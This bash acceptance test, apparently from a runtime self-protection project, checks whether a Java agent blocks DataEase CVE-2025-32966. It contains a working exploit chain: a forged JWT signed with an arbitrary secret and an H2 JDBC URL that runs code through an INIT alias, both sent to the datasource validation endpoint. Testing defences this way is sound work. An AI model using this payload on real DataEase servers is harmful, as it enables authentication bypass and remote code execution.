#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_DATAEASE_IMAGE:-vulhub/dataease:2.10.7}"
mysql_image="${OHMYRASP_VULHUB_DATAEASE_MYSQL_IMAGE:-mysql:8.4}"
network="${OHMYRASP_VULHUB_DATAEASE_NETWORK:-ohmyrasp-vulhub-dataease32966}"
baseline_db="${OHMYRASP_VULHUB_DATAEASE_BASELINE_DB_NAME:-ohmyrasp-vulhub-dataease32966-db-baseline}"
protected_db="${OHMYRASP_VULHUB_DATAEASE_PROTECTED_DB_NAME:-ohmyrasp-vulhub-dataease32966-db-protected}"
baseline_name="${OHMYRASP_VULHUB_DATAEASE_BASELINE_NAME:-ohmyrasp-vulhub-dataease32966-baseline}"
protected_name="${OHMYRASP_VULHUB_DATAEASE_PROTECTED_NAME:-ohmyrasp-vulhub-dataease32966-protected}"
baseline_port="${OHMYRASP_VULHUB_DATAEASE_BASELINE_PORT:-18720}"
protected_port="${OHMYRASP_VULHUB_DATAEASE_PROTECTED_PORT:-18721}"
host_agent_jar="$(pwd)/agent-java17/build/libs/ohmyrasp-agent-java17.jar"
baseline_dir="logs/vulhub-dataease-2.10.7-java21-baseline"
protected_dir="logs/vulhub-dataease-2.10.7-java21-protected"
protected_log="${protected_dir}/events.jsonl"
marker="/tmp/ohmyrasp-dataease-32966"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java17:agentJava17Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker logs "$baseline_db" > "${baseline_dir}/mysql.log" 2>&1 || true
  docker logs "$protected_db" > "${protected_dir}/mysql.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" "$baseline_db" "$protected_db" >/dev/null 2>&1 || true
  docker network rm "$network" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" "$baseline_db" "$protected_db" >/dev/null 2>&1 || true
docker network rm "$network" >/dev/null 2>&1 || true
docker network create "$network" >/dev/null

docker run -d --name "$baseline_db" --network "$network" \
  -e MYSQL_ROOT_PASSWORD=root \
  -e MYSQL_DATABASE=dataease \
  "$mysql_image" >/dev/null
docker run -d --name "$protected_db" --network "$network" \
  -e MYSQL_ROOT_PASSWORD=root \
  -e MYSQL_DATABASE=dataease \
  "$mysql_image" >/dev/null

docker run -d --name "$baseline_name" --network "$network" -p "${baseline_port}:8100" \
  -e MYSQL_HOST="$baseline_db" \
  -e MYSQL_PORT=3306 \
  -e MYSQL_DB=dataease \
  -e MYSQL_USER=root \
  -e MYSQL_PASSWORD=root \
  "$image" >/dev/null

docker run -d --name "$protected_name" --network "$network" -p "${protected_port}:8100" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java17.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e MYSQL_HOST="$protected_db" \
  -e MYSQL_PORT=3306 \
  -e MYSQL_DB=dataease \
  -e MYSQL_USER=root \
  -e MYSQL_PASSWORD=root \
  -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java17.jar -Dohmyrasp.java17.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java17.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 420); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" || true)"
    if [[ "$status" == "200" || "$status" == "302" ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose DataEase at ${port}" >&2
  exit 1
}

build_request_body() {
  python3 - <<'PY'
import base64
import hashlib
import hmac
import json
import time

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"uid": 1, "oid": 1, "exp": int(time.time()) + 3600}
head = b64url(json.dumps(header, separators=(',', ':')).encode())
body = b64url(json.dumps(payload, separators=(',', ':')).encode())
signature = b64url(hmac.new(b'any-secret', f'{head}.{body}'.encode(), hashlib.sha256).digest())
config = {
    "jdbc": "jdbc:h2:mem:pwn;MODE=MSSQLServer;INIT=CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"touch\",\"/tmp/ohmyrasp-dataease-32966\"})\\; }$$\\;CALL EXEC()",
    "username": "",
    "password": "",
    "driver": "org.h2.Driver",
}
encoded = base64.b64encode(json.dumps(config, separators=(',', ':')).encode()).decode()
request = {"name": "p1", "type": "h2", "configuration": encoded}
print(f'{head}.{body}.{signature}')
print(json.dumps(request, separators=(',', ':')))
PY
}

post_validate() {
  local port="$1"
  local token="$2"
  local body="$3"
  local output="$4"
  curl -sS -i -X POST \
    -H "Content-Type: application/json" \
    -H "X-DE-TOKEN: ${token}" \
    --data-binary "$body" \
    -o "$output" \
    -w "%{http_code}" \
    "http://127.0.0.1:${port}/de2api/datasource/validate" || true
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

if ! grep -q '"event":"ohmyrasp-java17-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 17-compatible startup event in DataEase protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "DataEase protected startup produced a detection before the exploit request" >&2
  exit 1
fi

mapfile -t generated < <(build_request_body)
token="${generated[0]}"
body="${generated[1]}"

docker exec "$baseline_name" rm -f "$marker" || true
docker exec "$protected_name" rm -f "$marker" || true

baseline_status="$(post_validate "$baseline_port" "$token" "$body" "${baseline_dir}/datasource-validate.response")"
if [[ "$baseline_status" != "400" ]] || ! docker exec "$baseline_name" test -f "$marker"; then
  cat "${baseline_dir}/datasource-validate.response" >&2 || true
  echo "baseline DataEase did not execute the H2 datasource payload" >&2
  exit 1
fi

protected_status="$(post_validate "$protected_port" "$token" "$body" "${protected_dir}/datasource-validate.response")"
if [[ "$protected_status" != "400" ]]; then
  cat "${protected_dir}/datasource-validate.response" >&2 || true
  echo "protected DataEase returned unexpected status ${protected_status}" >&2
  exit 1
fi
if docker exec "$protected_name" test -f "$marker"; then
  echo "protected DataEase created ${marker} despite Java17-compatible RASP" >&2
  exit 1
fi
if ! grep -q '"hook":"org.h2.jdbc.JdbcConnection.<init>".*"algorithm":"java17_jdbc_h2_code_execution".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java17_jdbc_h2_code_execution block event for DataEase CVE-2025-32966" >&2
  exit 1
fi
if ! grep -q 'OhMyRASP Java 17 blocked suspicious JDBC URL' "${protected_dir}/datasource-validate.response"; then
  cat "${protected_dir}/datasource-validate.response" >&2 || true
  echo "protected DataEase response did not include the Java 17 JDBC block exception" >&2
  exit 1
fi

echo "vulhub DataEase 2.10.7 CVE-2025-32966 Java21 runtime acceptance passed"
